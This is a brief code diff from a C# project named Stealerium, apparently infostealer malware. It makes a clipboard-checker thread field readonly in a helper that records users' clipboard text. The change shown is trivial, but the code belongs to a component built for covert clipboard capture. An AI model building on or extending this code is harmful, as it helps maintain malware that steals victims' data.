@@ -8,7 +8,7 @@ namespace Stealerium.Helpers
         // Current clipboard content
         private static string _prevClipboard = "";
         public static string ClipboardText = "";
-        public static Thread MainThread = new Thread(Run);
+        public static readonly Thread MainThread = new Thread(Run);
 
         // Run clipboard checker
         private static void Run()
